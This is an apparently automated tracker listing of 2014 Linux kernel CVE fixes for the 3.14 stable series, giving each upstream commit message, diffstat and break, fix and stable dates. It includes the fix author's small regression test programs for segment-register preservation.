    Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

 virt/kvm/iommu.c |    8 ++++----
 1 file changed, 4 insertions(+), 4 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-11-10
CVE: CVE-2014-8369
Break Date: 2014-08-19
Break Commit: 350b8bdd689cd2ab2c67c8a86a0be86cfa0751a7
Break Tag: 3.17
Linus Fix Date: 2014-10-24
Linus Commit: 3d32e4dbe71374a6780eaf51d719d76f9a9bf22f
Linus Tag: 3.18
Stable Date: 2014-11-14
Stable Commit: 8c373cfce6904feccca7ccf2a61e236db56dedf4
Stable Tag: 3.14.24

CVE-2014-8480:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 3f6f1480d86bf9fc16c160d803ab1d006e3058d5
Author: Nadav Amit <namit@cs.technion.ac.il>
Date:   Mon Oct 13 13:04:14 2014 +0300

    KVM: x86: PREFETCH and HINT_NOP should have SrcMem flag
    
    The decode phase of the x86 emulator assumes that every instruction with the
    ModRM flag, and which can be used with RIP-relative addressing, has either
    SrcMem or DstMem.  This is not the case for several instructions - prefetch,
    hint-nop and clflush.
    
    Adding SrcMem|NoAccess for prefetch and hint-nop and SrcMem for clflush.
    
    This fixes CVE-2014-8480.
    
    Fixes: 41061cdb98a0bec464278b4db8e894a3121671f5
    Cc: stable@vger.kernel.org
    Signed-off-by: Nadav Amit <namit@cs.technion.ac.il>
    Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

 arch/x86/kvm/emulate.c |    7 ++++---
 1 file changed, 4 insertions(+), 3 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-11-10
CVE: CVE-2014-8480
Break Date: 2014-07-11
Break Commit: 41061cdb98a0bec464278b4db8e894a3121671f5
Break Tag: 3.17
Linus Fix Date: 2014-10-24
Linus Commit: 3f6f1480d86bf9fc16c160d803ab1d006e3058d5
Linus Tag: 3.18
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2014-8480:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 63ea0a49ae0b145b91ff2b070c01b66fc75854b9
Author: Nadav Amit <nadav.amit@gmail.com>
Date:   Thu Jan 8 11:59:03 2015 +0100

    KVM: x86: Fix of previously incomplete fix for CVE-2014-8480
    
    STR and SLDT with rip-relative operand can cause a host kernel oops.
    Mark them as DstMem as well.
    
    Cc: stable@vger.linux.org
    Signed-off-by: Nadav Amit <namit@cs.technion.ac.il>
    Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

 arch/x86/kvm/emulate.c |    4 ++--
 1 file changed, 2 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-11-10
CVE: CVE-2014-8480
Break Date: 2014-07-11
Break Commit: 41061cdb98a0bec464278b4db8e894a3121671f5
Break Tag: 3.17
Linus Fix Date: 2015-01-23
Linus Commit: 63ea0a49ae0b145b91ff2b070c01b66fc75854b9
Linus Tag: 3.19
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2014-8481:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit a430c9166312e1aa3d80bce32374233bdbfeba32
Author: Paolo Bonzini <pbonzini@redhat.com>
Date:   Thu Oct 23 14:54:14 2014 +0200

    KVM: emulate: avoid accessing NULL ctxt->memopp
    
    A failure to decode the instruction can cause a NULL pointer access.
    This is fixed simply by moving the "done" label as close as possible
    to the return.
    
    This fixes CVE-2014-8481.
    
    Reported-by: Andy Lutomirski <luto@amacapital.net>
    Cc: stable@vger.kernel.org
    Fixes: 41061cdb98a0bec464278b4db8e894a3121671f5
    Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

 arch/x86/kvm/emulate.c |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-11-10
CVE: CVE-2014-8481
Break Date: 2014-07-11
Break Commit: 41061cdb98a0bec464278b4db8e894a3121671f5
Break Tag: 3.17
Linus Fix Date: 2014-10-24
Linus Commit: a430c9166312e1aa3d80bce32374233bdbfeba32
Linus Tag: 3.18
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2014-8559:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.40.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 946e51f2bf37f1656916eb75bd0742ba33983c28
Author: Al Viro <viro@zeniv.linux.org.uk>
Date:   Sun Oct 26 19:19:16 2014 -0400

    move d_rcu from overlapping d_child to overlapping d_alias
    
    Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>

 arch/powerpc/platforms/cell/spufs/inode.c       |    2 +-
 drivers/staging/lustre/lustre/llite/dcache.c    |    2 +-
 drivers/staging/lustre/lustre/llite/llite_lib.c |    2 +-
 drivers/staging/lustre/lustre/llite/namei.c     |    8 ++--
 fs/affs/amigaffs.c                              |    2 +-
 fs/autofs4/expire.c                             |   12 ++---
 fs/autofs4/root.c                               |    2 +-
 fs/ceph/dir.c                                   |    8 ++--
 fs/ceph/inode.c                                 |    2 +-
 fs/cifs/inode.c                                 |    2 +-
 fs/coda/cache.c                                 |    2 +-
 fs/dcache.c                                     |   53 +++++++++++------------
 fs/debugfs/inode.c                              |    2 +-
 fs/exportfs/expfs.c                             |    2 +-
 fs/libfs.c                                      |   12 ++---
 fs/ncpfs/dir.c                                  |    2 +-
 fs/ncpfs/ncplib_kernel.h                        |    4 +-
 fs/nfs/getroot.c                                |    2 +-
 fs/notify/fsnotify.c                            |    4 +-
 fs/ocfs2/dcache.c                               |    2 +-
 include/linux/dcache.h                          |    8 ++--
 kernel/trace/trace.c                            |    4 +-
 kernel/trace/trace_events.c                     |    2 +-
 security/selinux/selinuxfs.c                    |    6 +--
 24 files changed, 73 insertions(+), 74 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-11-10
CVE: CVE-2014-8559
Break Date: 2011-03-15
Break Commit: c826cb7dfce80512c26c984350077a25046bd215
Break Tag: 2.6
Linus Fix Date: 2014-11-03
Linus Commit: 946e51f2bf37f1656916eb75bd0742ba33983c28
Linus Tag: 3.19
Stable Date: 2015-04-29
Stable Commit: 5c48ea64a86415fde0859267a194442d26d2e70c
Stable Tag: 3.14.40

CVE-2014-8559:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.43.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit ca5358ef75fc69fee5322a38a340f5739d997c10
Author: Al Viro <viro@zeniv.linux.org.uk>
Date:   Sun Oct 26 19:31:10 2014 -0400

    deal with deadlock in d_walk()
    
    ... by not hitting rename_retry for reasons other than rename having
    happened.  In other words, do _not_ restart when finding that
    between unlocking the child and locking the parent the former got
    into __dentry_kill().  Skip the killed siblings instead...
    
    Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>

 fs/dcache.c |   31 ++++++++++++++++---------------
 1 file changed, 16 insertions(+), 15 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-11-10
CVE: CVE-2014-8559
Break Date: 2011-03-15
Break Commit: c826cb7dfce80512c26c984350077a25046bd215
Break Tag: 2.6
Linus Fix Date: 2014-11-03
Linus Commit: ca5358ef75fc69fee5322a38a340f5739d997c10
Linus Tag: 3.19
Stable Date: 2015-05-17
Stable Commit: 9cf2961ba6adaa14e06e1aa48fc65dadea49f9e2
Stable Tag: 3.14.43

CVE-2014-8884:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.25.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit f2e323ec96077642d397bb1c355def536d489d16
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Fri Sep 5 09:09:28 2014 -0300

    [media] ttusb-dec: buffer overflow in ioctl
    
    We need to add a limit check here so we don't overflow the buffer.
    
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Signed-off-by: Mauro Carvalho Chehab <mchehab@osg.samsung.com>

 drivers/media/usb/ttusb-dec/ttusbdecfe.c |    3 +++
 1 file changed, 3 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-11-29
CVE: CVE-2014-8884
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-09-23
Linus Commit: f2e323ec96077642d397bb1c355def536d489d16
Linus Tag: 3.19
Stable Date: 2014-11-21
Stable Commit: c8e0fd4818f29aaafafb01f0bacf376b86e82830
Stable Tag: 3.14.25

CVE-2014-8989:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.28.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 273d2c67c3e179adb1e74f403d1e9a06e3f841b5
Author: Eric W. Biederman <ebiederm@xmission.com>
Date:   Fri Dec 5 18:01:11 2014 -0600

    userns: Don't allow setgroups until a gid mapping has been setablished
    
    setgroups is unique in not needing a valid mapping before it can be called,
    in the case of setgroups(0, NULL) which drops all supplemental groups.
    
    The design of the user namespace assumes that CAP_SETGID can not actually
    be used until a gid mapping is established.  Therefore add a helper function
    to see if the user namespace gid mapping has been established and call
    that function in the setgroups permission check.
    
    This is part of the fix for CVE-2014-8989, being able to drop groups
    without privilege using user namespaces.
    
    Cc: stable@vger.kernel.org
    Reviewed-by: Andy Lutomirski <luto@amacapital.net>
    Signed-off-by: "Eric W. Biederman" <ebiederm@xmission.com>

 include/linux/user_namespace.h |    5 +++++
 kernel/groups.c                |    4 +++-
 kernel/user_namespace.c        |   14 ++++++++++++++
 3 files changed, 22 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-11-29
CVE: CVE-2014-8989
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-12-09
Linus Commit: 273d2c67c3e179adb1e74f403d1e9a06e3f841b5
Linus Tag: 3.19
Stable Date: 2015-01-08
Stable Commit: f077e88fc9f0befcf0441be2fed9516881ab02ef
Stable Tag: 3.14.28

CVE-2014-8989:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.28.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 80dd00a23784b384ccea049bfb3f259d3f973b9d
Author: Eric W. Biederman <ebiederm@xmission.com>
Date:   Fri Dec 5 18:26:30 2014 -0600

    userns: Check euid no fsuid when establishing an unprivileged uid mapping
    
    setresuid allows the euid to be set to any of uid, euid, suid, and
    fsuid.  Therefor it is safe to allow an unprivileged user to map
    their euid and use CAP_SETUID privileged with exactly that uid,
    as no new credentials can be obtained.
    
    I can not find a combination of existing system calls that allows setting
    uid, euid, suid, and fsuid from the fsuid making the previous use
    of fsuid for allowing unprivileged mappings a bug.
    
    This is part of a fix for CVE-2014-8989.
    
    Cc: stable@vger.kernel.org
    Reviewed-by: Andy Lutomirski <luto@amacapital.net>
    Signed-off-by: "Eric W. Biederman" <ebiederm@xmission.com>

 kernel/user_namespace.c |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-11-29
CVE: CVE-2014-8989
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-12-09
Linus Commit: 80dd00a23784b384ccea049bfb3f259d3f973b9d
Linus Tag: 3.19
Stable Date: 2015-01-08
Stable Commit: ea7c8d3da1bd9b90fd96d4b357c869b93552ee21
Stable Tag: 3.14.28

CVE-2014-8989:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.28.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit be7c6dba2332cef0677fbabb606e279ae76652c3
Author: Eric W. Biederman <ebiederm@xmission.com>
Date:   Fri Dec 5 18:14:19 2014 -0600

    userns: Don't allow unprivileged creation of gid mappings
    
    As any gid mapping will allow and must allow for backwards
    compatibility dropping groups don't allow any gid mappings to be
    established without CAP_SETGID in the parent user namespace.
    
    For a small class of applications this change breaks userspace
    and removes useful functionality.  This small class of applications
    includes tools/testing/selftests/mount/unprivilged-remount-test.c
    
    Most of the removed functionality will be added back with the addition
    of a one way knob to disable setgroups.  Once setgroups is disabled
    setting the gid_map becomes as safe as setting the uid_map.
    
    For more common applications that set the uid_map and the gid_map
    with privilege this change will have no affect.
    
    This is part of a fix for CVE-2014-8989.
    
    Cc: stable@vger.kernel.org
    Reviewed-by: Andy Lutomirski <luto@amacapital.net>
    Signed-off-by: "Eric W. Biederman" <ebiederm@xmission.com>

 kernel/user_namespace.c |    4 ----
 1 file changed, 4 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-11-29
CVE: CVE-2014-8989
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-12-09
Linus Commit: be7c6dba2332cef0677fbabb606e279ae76652c3
Linus Tag: 3.19
Stable Date: 2015-01-08
Stable Commit: 804733ad85b1ab68812fa438b3b4133d1d85581a
Stable Tag: 3.14.28

CVE-2014-8989:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.28.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit f95d7918bd1e724675de4940039f2865e5eec5fe
Author: Eric W. Biederman <ebiederm@xmission.com>
Date:   Wed Nov 26 23:22:14 2014 -0600

    userns: Only allow the creator of the userns unprivileged mappings
    
    If you did not create the user namespace and are allowed
    to write to uid_map or gid_map you should already have the necessary
    privilege in the parent user namespace to establish any mapping
    you want so this will not affect userspace in practice.
    
    Limiting unprivileged uid mapping establishment to the creator of the
    user namespace makes it easier to verify all credentials obtained with
    the uid mapping can be obtained without the uid mapping without
    privilege.
    
    Limiting unprivileged gid mapping establishment (which is temporarily
    absent) to the creator of the user namespace also ensures that the
    combination of uid and gid can already be obtained without privilege.
    
    This is part of the fix for CVE-2014-8989.
    
    Cc: stable@vger.kernel.org
    Reviewed-by: Andy Lutomirski <luto@amacapital.net>
    Signed-off-by: "Eric W. Biederman" <ebiederm@xmission.com>

 kernel/user_namespace.c |    6 ++++--
 1 file changed, 4 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-11-29
CVE: CVE-2014-8989
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-12-09
Linus Commit: f95d7918bd1e724675de4940039f2865e5eec5fe
Linus Tag: 3.19
Stable Date: 2015-01-08
Stable Commit: 7faecd49fcc937d1ea700a8dc46bbc90b88f4ff4
Stable Tag: 3.14.28

CVE-2014-9090:
CVE-2014-9322:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.26.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 6f442be2fb22be02cafa606f1769fa1e6f894441
Author: Andy Lutomirski <luto@amacapital.net>
Date:   Sat Nov 22 18:00:32 2014 -0800

    x86_64, traps: Stop using IST for #SS
    
    On a 32-bit kernel, this has no effect, since there are no IST stacks.
    
    On a 64-bit kernel, #SS can only happen in user code, on a failed iret
    to user space, a canonical violation on access via RSP or RBP, or a
    genuine stack segment violation in 32-bit kernel code.  The first two
    cases don't need IST, and the latter two cases are unlikely fatal bugs,
    and promoting them to double faults would be fine.
    
    This fixes a bug in which the espfix64 code mishandles a stack segment
    violation.
    
    This saves 4k of memory per CPU and a tiny bit of code.
    
    Signed-off-by: Andy Lutomirski <luto@amacapital.net>
    Reviewed-by: Thomas Gleixner <tglx@linutronix.de>
    Cc: stable@vger.kernel.org
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 arch/x86/include/asm/page_32_types.h |    1 -
 arch/x86/include/asm/page_64_types.h |   11 +++++------
 arch/x86/include/asm/traps.h         |    1 +
 arch/x86/kernel/dumpstack_64.c       |    1 -
 arch/x86/kernel/entry_64.S           |    2 +-
 arch/x86/kernel/traps.c              |   18 +-----------------
 6 files changed, 8 insertions(+), 26 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-11-29
CVE: CVE-2014-9090
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-11-23
Linus Commit: 6f442be2fb22be02cafa606f1769fa1e6f894441
Linus Tag: 3.18
Stable Date: 2014-12-06
Stable Commit: c6328855c41c28b2a53c7c6821af60dd3b41ddba
Stable Tag: 3.14.26

CVE-2014-9090:
CVE-2014-9322:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.26.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 6f442be2fb22be02cafa606f1769fa1e6f894441
Author: Andy Lutomirski <luto@amacapital.net>
Date:   Sat Nov 22 18:00:32 2014 -0800

    x86_64, traps: Stop using IST for #SS
    
    On a 32-bit kernel, this has no effect, since there are no IST stacks.
    
    On a 64-bit kernel, #SS can only happen in user code, on a failed iret
    to user space, a canonical violation on access via RSP or RBP, or a
    genuine stack segment violation in 32-bit kernel code.  The first two
    cases don't need IST, and the latter two cases are unlikely fatal bugs,
    and promoting them to double faults would be fine.
    
    This fixes a bug in which the espfix64 code mishandles a stack segment
    violation.
    
    This saves 4k of memory per CPU and a tiny bit of code.
    
    Signed-off-by: Andy Lutomirski <luto@amacapital.net>
    Reviewed-by: Thomas Gleixner <tglx@linutronix.de>
    Cc: stable@vger.kernel.org
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 arch/x86/include/asm/page_32_types.h |    1 -
 arch/x86/include/asm/page_64_types.h |   11 +++++------
 arch/x86/include/asm/traps.h         |    1 +
 arch/x86/kernel/dumpstack_64.c       |    1 -
 arch/x86/kernel/entry_64.S           |    2 +-
 arch/x86/kernel/traps.c              |   18 +-----------------
 6 files changed, 8 insertions(+), 26 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-11-29
CVE: CVE-2014-9090
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-11-23
Linus Commit: 6f442be2fb22be02cafa606f1769fa1e6f894441
Linus Tag: 3.18
Stable Date: 2014-12-06
Stable Commit: c6328855c41c28b2a53c7c6821af60dd3b41ddba
Stable Tag: 3.14.26

CVE-2014-9322:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.26.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit b645af2d5905c4e32399005b867987919cbfc3ae
Author: Andy Lutomirski <luto@amacapital.net>
Date:   Sat Nov 22 18:00:33 2014 -0800

    x86_64, traps: Rework bad_iret
    
    It's possible for iretq to userspace to fail.  This can happen because
    of a bad CS, SS, or RIP.
    
    Historically, we've handled it by fixing up an exception from iretq to
    land at bad_iret, which pretends that the failed iret frame was really
    the hardware part of #GP(0) from userspace.  To make this work, there's
    an extra fixup to fudge the gs base into a usable state.
    
    This is suboptimal because it loses the original exception.  It's also
    buggy because there's no guarantee that we were on the kernel stack to
    begin with.  For example, if the failing iret happened on return from an
    NMI, then we'll end up executing general_protection on the NMI stack.
    This is bad for several reasons, the most immediate of which is that
    general_protection, as a non-paranoid idtentry, will try to deliver
    signals and/or schedule from the wrong stack.
    
    This patch throws out bad_iret entirely.  As a replacement, it augments
    the existing swapgs fudge into a full-blown iret fixup, mostly written
    in C.  It's should be clearer and more correct.
    
    Signed-off-by: Andy Lutomirski <luto@amacapital.net>
    Reviewed-by: Thomas Gleixner <tglx@linutronix.de>
    Cc: stable@vger.kernel.org
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 arch/x86/kernel/entry_64.S |   45 +++++++++++++++++++-------------------------
 arch/x86/kernel/traps.c    |   29 ++++++++++++++++++++++++++++
 2 files changed, 48 insertions(+), 26 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-12-17
CVE: CVE-2014-9322
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-11-23
Linus Commit: b645af2d5905c4e32399005b867987919cbfc3ae
Linus Tag: 3.18
Stable Date: 2014-12-06
Stable Commit: fd2375c314545a7ce29f05b5b3889b171ba5fd39
Stable Tag: 3.14.26

CVE-2014-9419:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.28.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit f647d7c155f069c1a068030255c300663516420e
Author: Andy Lutomirski <luto@amacapital.net>
Date:   Mon Dec 8 13:55:20 2014 -0800

    x86_64, switch_to(): Load TLS descriptors before switching DS and ES
    
    Otherwise, if buggy user code points DS or ES into the TLS
    array, they would be corrupted after a context switch.
    
    This also significantly improves the comments and documents some
    gotchas in the code.
    
    Before this patch, the both tests below failed.  With this
    patch, the es test passes, although the gsbase test still fails.
    
     ----- begin es test -----
    
    /*
     * Copyright (c) 2014 Andy Lutomirski
     * GPL v2
     */
    
    static unsigned short GDT3(int idx)
    {
    	return (idx << 3) | 3;
    }
    
    static int create_tls(int idx, unsigned int base)
    {
    	struct user_desc desc = {
    		.entry_number    = idx,
    		.base_addr       = base,
    		.limit           = 0xfffff,
    		.seg_32bit       = 1,
    		.contents        = 0, /* Data, grow-up */
    		.read_exec_only  = 0,
    		.limit_in_pages  = 1,
    		.seg_not_present = 0,
    		.useable         = 0,
    	};
    
    	if (syscall(SYS_set_thread_area, &desc) != 0)
    		err(1, "set_thread_area");
    
    	return desc.entry_number;
    }
    
    int main()
    {
    	int idx = create_tls(-1, 0);
    	printf("Allocated GDT index %d\n", idx);
    
    	unsigned short orig_es;
    	asm volatile ("mov %%es,%0" : "=rm" (orig_es));
    
    	int errors = 0;
    	int total = 1000;
    	for (int i = 0; i < total; i++) {
    		asm volatile ("mov %0,%%es" : : "rm" (GDT3(idx)));
    		usleep(100);
    
    		unsigned short es;
    		asm volatile ("mov %%es,%0" : "=rm" (es));
    		asm volatile ("mov %0,%%es" : : "rm" (orig_es));
    		if (es != GDT3(idx)) {
    			if (errors == 0)
    				printf("[FAIL]\tES changed from 0x%hx to 0x%hx\n",
    				       GDT3(idx), es);
    			errors++;
    		}
    	}
    
    	if (errors) {
    		printf("[FAIL]\tES was corrupted %d/%d times\n", errors, total);
    		return 1;
    	} else {
    		printf("[OK]\tES was preserved\n");
    		return 0;
    	}
    }
    
     ----- end es test -----
    
     ----- begin gsbase test -----
    
    /*
     * gsbase.c, a gsbase test
     * Copyright (c) 2014 Andy Lutomirski
     * GPL v2
     */
    
    static unsigned char *testptr, *testptr2;
    
    static unsigned char read_gs_testvals(void)
    {
    	unsigned char ret;
    	asm volatile ("movb %%gs:%1, %0" : "=r" (ret) : "m" (*testptr));
    	return ret;
    }
    
    int main()
    {
    	int errors = 0;
    
    	testptr = mmap((void *)0x200000000UL, 1, PROT_READ | PROT_WRITE,
    		       MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
    	if (testptr == MAP_FAILED)
    		err(1, "mmap");
    
    	testptr2 = mmap((void *)0x300000000UL, 1, PROT_READ | PROT_WRITE,
    		       MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
    	if (testptr2 == MAP_FAILED)
    		err(1, "mmap");
    
    	*testptr = 0;
    	*testptr2 = 1;
    
    	if (syscall(SYS_arch_prctl, ARCH_SET_GS,
    		    (unsigned long)testptr2 - (unsigned long)testptr) != 0)
    		err(1, "ARCH_SET_GS");
    
    	usleep(100);
    
    	if (read_gs_testvals() == 1) {
    		printf("[OK]\tARCH_SET_GS worked\n");
    	} else {
    		printf("[FAIL]\tARCH_SET_GS failed\n");
    		errors++;
    	}
    
    	asm volatile ("mov %0,%%gs" : : "r" (0));
    
    	if (read_gs_testvals() == 0) {
    		printf("[OK]\tWriting 0 to gs worked\n");
    	} else {
    		printf("[FAIL]\tWriting 0 to gs failed\n");
    		errors++;
    	}
    
    	usleep(100);
    
    	if (read_gs_testvals() == 0) {
    		printf("[OK]\tgsbase is still zero\n");
    	} else {
    		printf("[FAIL]\tgsbase was corrupted\n");
    		errors++;
    	}
    
    	return errors == 0 ? 0 : 1;
    }
    
     ----- end gsbase test -----
    
    Signed-off-by: Andy Lutomirski <luto@amacapital.net>
    Cc: <stable@vger.kernel.org>
    Cc: Andi Kleen <andi@firstfloor.org>
    Cc: Linus Torvalds <torvalds@linux-foundation.org>
    Link: http://lkml.kernel.org/r/509d27c9fec78217691c3dad91cec87e1006b34a.1418075657.git.luto@amacapital.net
    Signed-off-by: Ingo Molnar <mingo@kernel.org>

 arch/x86/kernel/process_64.c |  101 ++++++++++++++++++++++++++++++------------
 1 file changed, 73 insertions(+), 28 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-12-25
CVE: CVE-2014-9419
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-12-11
Linus Commit: f647d7c155f069c1a068030255c300663516420e
Linus Tag: 3.19
Stable Date: 2015-01-08
Stable Commit: b7e804ab2e46308e54c0ec2b9e242271a455ddb8
Stable Tag: 3.14.28

CVE-2014-9420:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.28.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit f54e18f1b831c92f6512d2eedb224cd63d607d3d
Author: Jan Kara <jack@suse.cz>
Date:   Mon Dec 15 14:22:46 2014 +0100

    isofs: Fix infinite looping over CE entries
    
    Rock Ridge extensions define so called Continuation Entries (CE) which
    define where is further space with Rock Ridge data. Corrupted isofs
    image can contain arbitrarily long chain of these, including a one
    containing loop and thus causing kernel to end in an infinite loop when
    traversing these entries.
    
    Limit the traversal to 32 entries which should be more than enough space
    to store all the Rock Ridge data.
    
    Reported-by: P J P <ppandit@redhat.com>
    CC: stable@vger.kernel.org
    Signed-off-by: Jan Kara <jack@suse.cz>

 fs/isofs/rock.c |    6 ++++++
 1 file changed, 6 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-12-25
CVE: CVE-2014-9420
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-12-15
Linus Commit: f54e18f1b831c92f6512d2eedb224cd63d607d3d
Linus Tag: 3.19
Stable Date: 2015-01-08
Stable Commit: 8190393a88f2b0321263a54f2a9eb5a2aa43be7e
Stable Tag: 3.14.28

CVE-2014-9428:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.30.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 5b6698b0e4a37053de35cc24ee695b98a7eb712b
Author: Sven Eckelmann <sven@narfation.org>
Date:   Sat Dec 20 13:48:55 2014 +0100

    batman-adv: Calculate extra tail size based on queued fragments
    
    The fragmentation code was replaced in 610bfc6bc99bc83680d190ebc69359a05fc7f605
    ("batman-adv: Receive fragmented packets and merge"). The new code provided a
    mostly unused parameter skb for the merging function. It is used inside the
    function to calculate the additionally needed skb tailroom. But instead of
    increasing its own tailroom, it is only increasing the tailroom of the first
    queued skb. This is not correct in some situations because the first queued
    entry can be a different one than the parameter.
    
    An observed problem was:
    
    1. packet with size 104, total_size 1464, fragno 1 was received
       - packet is queued
    2. packet with size 1400, total_size 1464, fragno 0 was received
       - packet is queued at the end of the list
    3. enough data was received and can be given to the merge function
       (1464 == (1400 - 20) + (104 - 20))
       - merge functions gets 1400 byte large packet as skb argument
    4. merge function gets first entry in queue (104 byte)
       - stored as skb_out
    5. merge function calculates the required extra tail as total_size - skb->len
       - pskb_expand_head tail of skb_out with 64 bytes
    6. merge function tries to squeeze the extra 1380 bytes from the second queued
       skb (1400 byte aka skb parameter) in the 64 extra tail bytes of skb_out
    
    Instead calculate the extra required tail bytes for skb_out also using skb_out
    instead of using the parameter skb. The skb parameter is only used to get the
    total_size from the last received packet. This is also the total_size used to
    decide that all fragments were received.
    
    Reported-by: Philipp Psurek <philipp.psurek@gmail.com>
    Signed-off-by: Sven Eckelmann <sven@narfation.org>
    Acked-by: Martin Hundebll <martin@hundeboll.net>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/batman-adv/fragmentation.c |    2 +-
